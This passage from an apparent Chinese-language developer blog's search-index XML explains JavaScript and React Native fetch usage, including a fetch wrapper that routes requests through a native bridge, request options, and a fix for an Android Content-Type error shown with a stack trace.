punctuation">}</span>                    globalId <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">//此处调用native端request网络请求</span>                WEBAPP<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span>message<span class="token punctuation">.</span>url<span class="token punctuation">,</span> message<span class="token punctuation">.</span>data<span class="token punctuation">,</span> message<span class="token punctuation">.</span>method<span class="token punctuation">,</span>                     callback<span class="token punctuation">,</span> message<span class="token punctuation">.</span>headers<span class="token punctuation">,</span> message<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//此处是正常的原生fetch请求 添加超时处理</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>                <span class="token keyword">var</span> timeout <span class="token operator">=</span> opts<span class="token punctuation">.</span>timeout<span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>timeout<span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>                        <span class="token function">reject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"fetch timeout"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span><span class="token punctuation">,</span>timeout<span class="token punctuation">)</span>                <span class="token punctuation">}</span>                <span class="token function">oldFetchfn</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> opts<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>res<span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>                    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>                    <span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>                        <span class="token function">resolve</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>                    <span class="token punctuation">}</span><span class="token punctuation">,</span>                    <span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>                        <span class="token function">reject</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">)</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>前端正常使用fetch请求</p><pre class="line-numbers language-js"><code class="language-js"><span class="token function">fetch</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">{</span>    method<span class="token punctuation">:</span> <span class="token string">"GET"</span><span class="token punctuation">,</span>    headers<span class="token punctuation">:</span> <span class="token punctuation">{</span>        <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/json"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    credentials<span class="token punctuation">:</span> <span class="token string">"include"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>res <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>res <span class="token operator">&amp;&amp;</span> res<span class="token punctuation">.</span>respCode <span class="token operator">==</span> <span class="token string">"0"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> data<span class="token punctuation">:</span> res<span class="token punctuation">.</span>respData <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"服务端异常"</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span>err <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> fetch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> fetch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RN中Android fetch请求问题</title>
      <link href="2018/12/04/fetchandroid/"/>
      <url>2018/12/04/fetchandroid/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>作为前端开发人员，网络请求工具对大家来说肯定不陌生。iOS的AFNetworking，Android的okHttp等。但是对于RN来说，我们最常用到的就是js原生的Fetch请求了。</p></blockquote><p>React Native提供了和web标准一致的<a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API" target="_blank" rel="noopener">Fetch API</a>，用于满足开发者访问网络的需求。如果你之前使用过<code>XMLHttpRequest</code>(即俗称的ajax)或是其他的网络API，那么Fetch用起来将会相当容易上手。这篇文档只会列出Fetch的基本用法，并不会讲述太多细节，你可以使用你喜欢的搜索引擎去搜索<code>fetch api</code>关键字以了解更多信息。</p><h2 id="fetch请求的格式"><a href="#fetch请求的格式" class="headerlink" title="fetch请求的格式"></a>fetch请求的格式</h2><p>fetch使用链式调用的方式来进行操作，fetch的基本格式</p><pre class="line-numbers language-js"><code class="language-js"><span class="token function">fetch</span><span class="token punctuation">(</span>url <span class="token punctuation">,</span> fetchOptions<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token operator">...</span><span class="token comment" spellcheck="true">//数据解析方式</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span>responseData<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token operator">...</span><span class="token comment" spellcheck="true">//获取到的数据处理</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token operator">...</span><span class="token comment" spellcheck="true">//错误处理</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//结束链式</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>fetch(url)为发起网络请求的最简单的写法，只传入一个参数，默认的为GET方式请求，将网址作为参数传入fetch 的方法，如：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://mywebsite.com/mydata.json'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>fetch还有可选的第二个参数，即示例中的fetchOptions,是一个对象，对象中包含如下属性</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> fetchOptions <span class="token operator">=</span> <span class="token punctuation">{</span>    method<span class="token punctuation">:</span><span class="token string">'POST'</span><span class="token punctuation">,</span>    headers<span class="token punctuation">:</span><span class="token punctuation">{</span>        <span class="token string">'Accept'</span><span class="token punctuation">:</span><span class="token string">'application/json'</span><span class="token punctuation">,</span>        <span class="token string">'Content-Type'</span><span class="token punctuation">:</span><span class="token string">'application/json'</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    body<span class="token punctuation">:</span>JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        firstParam<span class="token punctuation">:</span><span class="token string">'yourValue'</span><span class="token punctuation">,</span>        secondParam<span class="token punctuation">:</span><span class="token string">'yourOtherValue'</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token function">fetch</span><span class="token punctuation">(</span>url <span class="token punctuation">,</span> fetchOptions<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>method：网络请求的方式(GET、POST等)</li><li>headers：网络请求的请求头对象，对象中包含(Accept、Content-Type、token等属性)</li><li>body：POST请求的请求体对象，即需要往服务器发送的数据</li><li>mode：跨域设置(cors, no-cors, same-origin)  不常用</li><li>cache：缓存选项（default, no-store, reload, no-cache, force-cache, or only-if-cached）不常用</li></ul><h5 id="参数解释"><a href="#参数解释" class="headerlink" title="参数解释"></a>参数解释</h5><p>1、headers请求头遵循http协议规范，通常设置Accept、Content-Type属性。<br>Accept：希望接受的数据类型<br>Content-Type：发送的实体数据的数据类型</p><pre class="line-numbers language-js"><code class="language-js">headers<span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token string">'Accept'</span> <span class="token punctuation">:</span> <span class="token string">'application/json'</span><span class="token punctuation">,</span>    <span class="token string">'Content-Type'</span> <span class="token punctuation">:</span> <span class="token string">'application/json'</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>2、body的传入参数有三种方式：<br> 方式一：不推荐，可能在某些服务器无法识别。</p><pre class="line-numbers language-js"><code class="language-js">JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span>key<span class="token punctuation">:</span>value1 <span class="token punctuation">,</span> key2<span class="token punctuation">:</span>value2 <span class="token punctuation">,</span> <span class="token operator">...</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>方式二：传统的form格式</p><pre class="line-numbers language-js"><code class="language-js"><span class="token string">'key1 = value1 &amp; key2 = value2'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>方式三：使用FormData</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"key1"</span> <span class="token punctuation">,</span> <span class="token string">"value1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"key2"</span> <span class="token punctuation">,</span> <span class="token string">"value2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>3、mode:控制属否允许跨域：</p><ul><li>same-origin: 同源请求，该模式是不允许跨域的，跨域回报error。</li><li>cors： 允许跨域请求，可以获取第三方数据，前提是所访问的服务允许跨域访问。</li><li>no-cors：默认mode。该模式允许发送本次跨域请求，但是不能访问响应返回的内容，即可以请求其他域的脚本、图片和其他资源，但是不能访问response里面的属性。</li></ul><h2 id="问题一"><a href="#问题一" class="headerlink" title="问题一"></a>问题一</h2><p>在封装RN fetch请求时header设置如下：</p><pre class="line-numbers language-js"><code class="language-js">headers<span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token string">'Accept'</span> <span class="token punctuation">:</span> <span class="token string">'application/json'</span><span class="token punctuation">,</span>    <span class="token string">'Content-Type'</span> <span class="token punctuation">:</span> <span class="token string">'application/json'</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>但是在Android手机上发送POST接口请求时底层报错如下：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token number">12</span><span class="token operator">-</span><span class="token number">01</span> <span class="token number">16</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">:</span><span class="token number">42.602</span> <span class="token number">26135</span><span class="token operator">-</span><span class="token number">26531</span><span class="token operator">/</span>air<span class="token punctuation">.</span>com<span class="token punctuation">.</span>wuba<span class="token punctuation">.</span>cardealertong W<span class="token operator">/</span>System<span class="token punctuation">.</span>err<span class="token punctuation">:</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>IllegalArgumentException<span class="token punctuation">:</span> multipart <span class="token operator">!=</span> application<span class="token operator">/</span>json<span class="token number">12</span><span class="token operator">-</span><span class="token number">01</span> <span class="token number">16</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">:</span><span class="token number">42.602</span> <span class="token number">26135</span><span class="token operator">-</span><span class="token number">26531</span><span class="token operator">/</span>air<span class="token punctuation">.</span>com<span class="token punctuation">.</span>wuba<span class="token punctuation">.</span>cardealertong W<span class="token operator">/</span>System<span class="token punctuation">.</span>err<span class="token punctuation">:</span>     at okhttp3<span class="token punctuation">.</span>MultipartBody$Builder<span class="token punctuation">.</span><span class="token function">setType</span><span class="token punctuation">(</span>MultipartBody<span class="token punctuation">.</span>java<span class="token punctuation">:</span><span class="token number">299</span><span class="token punctuation">)</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">01</span> <span class="token number">16</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">:</span><span class="token number">42.602</span> <span class="token number">26135</span><span class="token operator">-</span><span class="token number">26531</span><span class="token operator">/</span>air<span class="token punctuation">.</span>com<span class="token punctuation">.</span>wuba<span class="token punctuation">.</span>cardealertong W<span class="token operator">/</span>System<span class="token punctuation">.</span>err<span class="token punctuation">:</span>     at com<span class="token punctuation">.</span>facebook<span class="token punctuation">.</span>react<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>network<span class="token punctuation">.</span>NetworkingModule<span class="token punctuation">.</span><span class="token function">constructMultipartBody</span><span class="token punctuation">(</span>NetworkingModule<span class="token punctuation">.</span>java<span class="token punctuation">:</span><span class="token number">622</span><span class="token punctuation">)</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">01</span> <span class="token number">16</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">:</span><span class="token number">42.602</span> <span class="token number">26135</span><span class="token operator">-</span><span class="token number">26531</span><span class="token operator">/</span>air<span class="token punctuation">.</span>com<span class="token punctuation">.</span>wuba<span class="token punctuation">.</span>cardealertong W<span class="token operator">/</span>System<span class="token punctuation">.</span>err<span class="token punctuation">:</span>     at com<span class="token punctuation">.</span>facebook<span class="token punctuation">.</span>react<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>network<span class="token punctuation">.</span>NetworkingModule<span class="token punctuation">.</span><span class="token function">sendRequest</span><span class="token punctuation">(</span>NetworkingModule<span class="token punctuation">.</span>java<span class="token punctuation">:</span><span class="token number">410</span><span class="token punctuation">)</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">01</span> <span class="token number">16</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">:</span><span class="token number">42.602</span> <span class="token number">26135</span><span class="token operator">-</span><span class="token number">26531</span><span class="token operator">/</span>air<span class="token punctuation">.</span>com<span class="token punctuation">.</span>wuba<span class="token punctuation">.</span>cardealertong W<span class="token operator">/</span>System<span class="token punctuation">.</span>err<span class="token punctuation">:</span>     at java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>Native Method<span class="token punctuation">)</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">01</span> <span class="token number">16</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">:</span><span class="token number">42.602</span> <span class="token number">26135</span><span class="token operator">-</span><span class="token number">26531</span><span class="token operator">/</span>air<span class="token punctuation">.</span>com<span class="token punctuation">.</span>wuba<span class="token punctuation">.</span>cardealertong W<span class="token operator">/</span>System<span class="token punctuation">.</span>err<span class="token punctuation">:</span>     at com<span class="token punctuation">.</span>facebook<span class="token punctuation">.</span>react<span class="token punctuation">.</span>bridge<span class="token punctuation">.</span>JavaMethodWrapper<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>JavaMethodWrapper<span class="token punctuation">.</span>java<span class="token punctuation">:</span><span class="token number">374</span><span class="token punctuation">)</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">01</span> <span class="token number">16</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">:</span><span class="token number">42.602</span> <span class="token number">26135</span><span class="token operator">-</span><span class="token number">26531</span><span class="token operator">/</span>air<span class="token punctuation">.</span>com<span class="token punctuation">.</span>wuba<span class="token punctuation">.</span>cardealertong W<span class="token operator">/</span>System<span class="token punctuation">.</span>err<span class="token punctuation">:</span>     at com<span class="token punctuation">.</span>facebook<span class="token punctuation">.</span>react<span class="token punctuation">.</span>bridge<span class="token punctuation">.</span>JavaModuleWrapper<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>JavaModuleWrapper<span class="token punctuation">.</span>java<span class="token punctuation">:</span><span class="token number">162</span><span class="token punctuation">)</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">01</span> <span class="token number">16</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">:</span><span class="token number">42.602</span> <span class="token number">26135</span><span class="token operator">-</span><span class="token number">26531</span><span class="token operator">/</span>air<span class="token punctuation">.</span>com<span class="token punctuation">.</span>wuba<span class="token punctuation">.</span>cardealertong W<span class="token operator">/</span>System<span class="token punctuation">.</span>err<span class="token punctuation">:</span>     at com<span class="token punctuation">.</span>facebook<span class="token punctuation">.</span>react<span class="token punctuation">.</span>bridge<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>NativeRunnable<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>Native Method<span class="token punctuation">)</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">01</span> <span class="token number">16</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">:</span><span class="token number">42.602</span> <span class="token number">26135</span><span class="token operator">-</span><span class="token number">26531</span><span class="token operator">/</span>air<span class="token punctuation">.</span>com<span class="token punctuation">.</span>wuba<span class="token punctuation">.</span>cardealertong W<span class="token operator">/</span>System<span class="token punctuation">.</span>err<span class="token punctuation">:</span>     at android<span class="token punctuation">.</span>os<span class="token punctuation">.</span>Handler<span class="token punctuation">.</span><span class="token function">handleCallback</span><span class="token punctuation">(</span>Handler<span class="token punctuation">.</span>java<span class="token punctuation">:</span><span class="token number">743</span><span class="token punctuation">)</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">01</span> <span class="token number">16</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">:</span><span class="token number">42.602</span> <span class="token number">26135</span><span class="token operator">-</span><span class="token number">26531</span><span class="token operator">/</span>air<span class="token punctuation">.</span>com<span class="token punctuation">.</span>wuba<span class="token punctuation">.</span>cardealertong W<span class="token operator">/</span>System<span class="token punctuation">.</span>err<span class="token punctuation">:</span>     at android<span class="token punctuation">.</span>os<span class="token punctuation">.</span>Handler<span class="token punctuation">.</span><span class="token function">dispatchMessage</span><span class="token punctuation">(</span>Handler<span class="token punctuation">.</span>java<span class="token punctuation">:</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">01</span> <span class="token number">16</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">:</span><span class="token number">42.602</span> <span class="token number">26135</span><span class="token operator">-</span><span class="token number">26531</span><span class="token operator">/</span>air<span class="token punctuation">.</span>com<span class="token punctuation">.</span>wuba<span class="token punctuation">.</span>cardealertong W<span class="token operator">/</span>System<span class="token punctuation">.</span>err<span class="token punctuation">:</span>     at com<span class="token punctuation">.</span>facebook<span class="token punctuation">.</span>react<span class="token punctuation">.</span>bridge<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>MessageQueueThreadHandler<span class="token punctuation">.</span><span class="token function">dispatchMessage</span><span class="token punctuation">(</span>MessageQueueThreadHandler<span class="token punctuation">.</span>java<span class="token punctuation">:</span><span class="token number">31</span><span class="token punctuation">)</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">01</span> <span class="token number">16</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">:</span><span class="token number">42.602</span> <span class="token number">26135</span><span class="token operator">-</span><span class="token number">26531</span><span class="token operator">/</span>air<span class="token punctuation">.</span>com<span class="token punctuation">.</span>wuba<span class="token punctuation">.</span>cardealertong W<span class="token operator">/</span>System<span class="token punctuation">.</span>err<span class="token punctuation">:</span>     at android<span class="token punctuation">.</span>os<span class="token punctuation">.</span>Looper<span class="token punctuation">.</span><span class="token function">loop</span><span class="token punctuation">(</span>Looper<span class="token punctuation">.</span>java<span class="token punctuation">:</span><span class="token number">150</span><span class="token punctuation">)</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">01</span> <span class="token number">16</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">:</span><span class="token number">42.602</span> <span class="token number">26135</span><span class="token operator">-</span><span class="token number">26531</span><span class="token operator">/</span>air<span class="token punctuation">.</span>com<span class="token punctuation">.</span>wuba<span class="token punctuation">.</span>cardealertong W<span class="token operator">/</span>System<span class="token punctuation">.</span>err<span class="token punctuation">:</span>     at com<span class="token punctuation">.</span>facebook<span class="token punctuation">.</span>react<span class="token punctuation">.</span>bridge<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>MessageQueueThreadImpl$<span class="token number">3</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>MessageQueueThreadImpl<span class="token punctuation">.</span>java<span class="token punctuation">:</span><span class="token number">194</span><span class="token punctuation">)</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">01</span> <span class="token number">16</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">:</span><span class="token number">42.602</span> <span class="token number">26135</span><span class="token operator">-</span><span class="token number">26531</span><span class="token operator">/</span>air<span class="token punctuation">.</span>com<span class="token punctuation">.</span>wuba<span class="token punctuation">.</span>cardealertong W<span class="token operator">/</span>System<span class="token punctuation">.</span>err<span class="token punctuation">:</span>     at java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span>java<span class="token punctuation">:</span><span class="token number">833</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>查看RN Android底层源码看到 RN的fetch请求在Android底层Content-Type只支持multipart/form-data类型</p><p>但是iOS底层支持application/json、text/plain、application/x-www-form-urlencoded类型；不支持multipart/form-data</p></blockquote><p>由于iOS对实体数据类型支持的格式不同需要分端处理header</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span>Platform<span class="token punctuation">.</span>OS <span class="token operator">==</span> <span class="token string">"ios"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    header <span class="token operator">=</span> <span class="token punctuation">{</span>        Accept<span class="token punctuation">:</span> <span class="token string">"application/json"</span><span class="token punctuation">,</span>        <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/json"</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    header <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"multipart/form-data"</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="问题二"><a href="#问题二" class="headerlink" title="问题二"></a>问题二</h2><p>POST请求封装如下：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">static</span> postRequrst <span class="token operator">=</span> <span class="token punctuation">(</span>url<span class="token punctuation">,</span> params <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> params<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">timeoutFetch</span><span class="token punctuation">(</span>        <span class="token function">fetch</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">{</span>            method<span class="token punctuation">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>            headers<span class="token punctuation">:</span> header<span class="token punctuation">,</span>            body<span class="token punctuation">:</span> formData        <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>response<span class="token punctuation">.</span>ok<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// alert("服务器繁忙，请稍后再试；\r\nCode:" + response.status);</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// response.code：是与服务器端约定code：200表示请求成功，非200表示请求失败，message：请求失败内容</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>response <span class="token operator">&amp;&amp;</span> response<span class="token punctuation">.</span>code <span class="token operator">===</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> response<span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> response<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// alert("当前网络不可用，请检查网络设置！");</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" 